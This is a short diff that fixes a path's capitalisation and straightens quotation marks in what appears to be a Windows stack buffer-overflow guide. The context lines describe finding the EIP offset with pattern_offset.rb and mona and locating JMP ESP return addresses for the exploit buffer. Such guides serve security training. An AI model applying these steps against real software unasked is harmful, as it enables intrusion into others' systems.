@@ -101,7 +101,7 @@ except:
 3.	Send the offset pattern and get the EIP value out of the Immunity Debugger.
 4. Get the amount of offset bytes.
 
-```/usr/share/Metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>```
+```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>```
 
 ```!mona po <EIP VALUE>```
 
@@ -154,7 +154,7 @@ JMP ESP
 output = \xff\xe4
 ```
 
-5. Get the all the JMP ESP return adressess `!mona find -s “\xff\xe4” -m <.dll file>`
+5. Get the all the JMP ESP return adressess `!mona find -s "\xff\xe4" -m <.dll file>`
 6. Write down all the JMP ESP return adresses
 7. Edit the buffer variable in the script with a JMP ESP return adress (Watch out for little andian for Windows) for the location where 4 * B for the EIP was.
 
